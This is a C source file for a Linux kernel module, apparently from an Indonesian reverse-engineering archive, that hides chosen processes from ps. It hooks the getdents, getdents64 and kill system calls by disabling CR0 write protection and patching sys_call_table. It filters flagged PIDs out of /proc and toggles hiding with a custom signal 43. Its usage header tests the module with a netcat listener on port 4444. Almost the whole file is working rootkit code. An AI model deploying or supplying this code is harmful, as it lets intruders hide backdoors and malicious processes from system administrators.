/*
    Hide Process
    Archive of Reversing.ID
    Based on Linux Kernel Module Programming Guide

    Tested on Linux Kernel 4.9.0-11-amd64 (Debian)

    Menyembunyikan process tertentu sehingga tak nampak pada ps.

Build:
    $ make

Module info:
    $ modinfo code.ko

List module:
    $ lsmod

Load:
    $ insmod code.ko

Testing:
    $ nc -lvp 4444 &

Unload:
    $ rmmod code
*/

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>

#include <linux/sched.h>
#include <linux/syscalls.h>
#include <linux/dirent.h>
#include <linux/slab.h>

#include <linux/uaccess.h>
#include <linux/fdtable.h>
#include <linux/proc_ns.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Reversing.ID");
MODULE_DESCRIPTION("Example of Char Driver (Linux)");


/*
    Menyembunyikan sebuah process dengan PID tertentu.
    Process akan tetap berjalan secara normal.

    Sebuah process yang akan dihilangkan harus ditandai dengan flag
    tertentu terlebih dahulu. Flag merupakan user-defined mask dan
    hanya dikenali di module ini.

    Sebuah process dapat diketahui dari entry di /proc. Penyembunyian
    dilakukan dengan menyembunyikan entry dari /proc.
*/

/* ****************** Type Definition & Data Declaration ****************** */

#define PF_INVISIBLE    0x10000000

/* 
    signal yang akan dikirimkan oleh kill menjadi command bagi module.
    gunakan signal yang termasuk ke dalam kategori real-time signal
    dan tidak digunakan dalam library.
*/
enum 
{
    SIGINVIS = 43,   
};

/* sepertinya struktur linux_dirent sudah obsolete (?) */
struct linux_dirent {
    unsigned long   d_ino;
    unsigned long   d_off;
    unsigned short  d_reclen;
    char            d_name[1];
};

unsigned long cr0;

/* pointer ke syscall table */
static unsigned long *__sys_call_table;

/* pointer ke syscall original */
typedef asmlinkage int (*_o_getdents_t  ) (unsigned int, struct linux_dirent *, unsigned int);
typedef asmlinkage int (*_o_getdents64_t) (unsigned int, struct linux_dirent64 *, unsigned int);
typedef asmlinkage int (*_o_kill_t  ) (pid_t, int);

_o_getdents_t   ptr_getdents;
_o_getdents64_t ptr_getdents64;
_o_kill_t ptr_kill;


/* ********************* Internal Functions Prototype ********************* */

/* dapatkan alamat syscall table */
unsigned long * get_syscall_table_addr (void);

asmlinkage int new_getdents   (unsigned int, struct linux_dirent *, unsigned int);
asmlinkage int new_getdents64 (unsigned int, struct linux_dirent64 *, unsigned int);
asmlinkage int new_kill (pid_t pid, int sig);


/* *************************** Helper Functions *************************** */

static inline void protect_memory(void)
{
    write_cr0(cr0);
}

static inline void unprotect_memory(void)
{
    write_cr0(cr0 & ~0x00010000);
}

struct task_struct * 
find_task (pid_t pid)
{
    struct task_struct * t = current;
    for_each_process(t) {
        if (t->pid == pid)
            return t;
    }
    return NULL;
}

int 
is_invisible(pid_t pid)
{
    struct task_struct * t;

    if (! pid)
        return 0;
    
    t = find_task(pid);
    if (! t)
        return 0;
    
    if (t->flags & PF_INVISIBLE)
        return 1;
    
    return 0;
}


/* ****************** Loadable Kernel Module Initialize ******************* */

static int __init code_init(void)
{
    /* temukan alamat syscall table */
    __sys_call_table = get_syscall_table_addr ();
    if (! __sys_call_table)
        return -1;

    cr0 = read_cr0 ();

    ptr_getdents   = (_o_getdents_t  ) __sys_call_table[__NR_getdents];
    ptr_getdents64 = (_o_getdents64_t) __sys_call_table[__NR_getdents64];
    ptr_kill = (_o_kill_t) __sys_call_table[__NR_kill];

    unprotect_memory();
    __sys_call_table[__NR_getdents]   = (unsigned long) new_getdents;
    __sys_call_table[__NR_getdents64] = (unsigned long) new_getdents64;
    __sys_call_table[__NR_kill] = (unsigned long) new_kill;
    protect_memory();

    return 0;
}

static void __exit code_exit(void)
{
    unprotect_memory();
    __sys_call_table[__NR_getdents]   = (unsigned long) ptr_getdents;
    __sys_call_table[__NR_getdents64] = (unsigned long) ptr_getdents64;
    __sys_call_table[__NR_kill] = (unsigned long) ptr_kill;
    protect_memory();
}

module_init(code_init);
module_exit(code_exit);


/* ******************* Internal Functions Implementation ******************* */

unsigned long * get_syscall_table_addr (void)
{
    unsigned long * result;

    result = (unsigned long *) kallsyms_lookup_name("sys_call_table");
    return result;
}


/*
    Digunakan untuk menelusuri /proc dan filter PID tertentu
*/
asmlinkage int 
new_getdents   (unsigned int fd, struct linux_dirent __user *dirent, unsigned int count)
{
    unsigned long  off  = 0;    /* offset di tabel inode */
    struct linux_dirent *dir, *kdirent, *prev = NULL;
    struct inode * d_inode;
    int retval, errc;    

    /* eksekusi syscall asli */
    retval = ptr_getdents(fd, dirent, count);
    if (retval <= 0)
        return retval;

    /* alokasikan memory untuk melakukan filtering */
    kdirent = kzalloc(retval, GFP_KERNEL);
    if (kdirent == NULL)
        return retval;

    /* salin data ke buffer kdirent untuk proses */
    errc = copy_from_user(kdirent, dirent, retval);
    if (! errc)
    {
        /* dapatkan directory inode saat ini (kernel > 3.19.0) */
        d_inode = current->files->fdt->fd[fd]->f_path.dentry->d_inode;
        
        /* 
            pastikan bahwa ini adalah /proc 
            baca juga module "hide-file" untuk melihat implementasi 
            hide file secara umum
        */
        if (d_inode->i_ino == PROC_ROOT_INO && !MAJOR(d_inode->i_rdev))
        {
            /* telusuri semua entry */
            while (off < retval)
            {
                dir = (void *) kdirent + off;
                if (is_invisible(simple_strtoul(dir->d_name, NULL, 10)))
                {
                    if (dir == kdirent)
                    {
                        retval -= dir->d_reclen;
                        memmove(dir, (void *) dir + dir->d_reclen, retval);
                        continue;
                    }
                    prev->d_reclen += dir->d_reclen;
                }
                else
                    prev = dir;
                
                off += dir->d_reclen;
            }

            errc = copy_to_user(dirent, kdirent, retval);
        }
    }

    kfree(kdirent);
    return retval;
}

asmlinkage int 
new_getdents64 (unsigned int fd, struct linux_dirent64 __user *dirent, unsigned int count)
{
    unsigned long  off  = 0;    /* offset di tabel inode */
    struct linux_dirent64 *dir, *kdirent, *prev = NULL;
    struct inode * d_inode;
    int retval, errc;    

    /* eksekusi syscall asli */
    retval = ptr_getdents64(fd, dirent, count);
    if (retval <= 0)
        return retval;

    /* alokasikan memory untuk melakukan filtering */
    kdirent = kzalloc(retval, GFP_KERNEL);
    if (kdirent == NULL)
        return retval;

    /* salin data ke buffer kdirent untuk proses */
    errc = copy_from_user(kdirent, dirent, retval);
    if (! errc)
    {
        /* dapatkan directory inode saat ini (kernel > 3.19.0) */
        d_inode = current->files->fdt->fd[fd]->f_path.dentry->d_inode;

        /* 
            pastikan bahwa ini adalah /proc 
            baca juga module "hide-file" untuk melihat implementasi 
            hide file secara umum
        */
        if (d_inode->i_ino == PROC_ROOT_INO && !MAJOR(d_inode->i_rdev))
        {
            /* telusuri semua entry */
            while (off < retval)
            {
                dir = (void *) kdirent + off;
                if (is_invisible(simple_strtoul(dir->d_name, NULL, 10)))
                {
                    if (dir == kdirent)
                    {
                        retval -= dir->d_reclen;
                        memmove(dir, (void *) dir + dir->d_reclen, retval);
                        continue;
                    }
                    prev->d_reclen += dir->d_reclen;
                }
                else
                    prev = dir;
                
                off += dir->d_reclen;
            }

            errc = copy_to_user(dirent, kdirent, retval);
        }
    }

    kfree(kdirent);
    return retval;
}

asmlinkage int 
new_kill (pid_t pid, int sig)
{
    struct task_struct * task;
    switch (sig)
    {
        case SIGINVIS:
            task = find_task(pid);
            if (task == NULL)
                return -ESRCH;
            
            task->flags ^= PF_INVISIBLE;
            break;
        default:
            return ptr_kill(pid, sig);
    }

    return 0;
}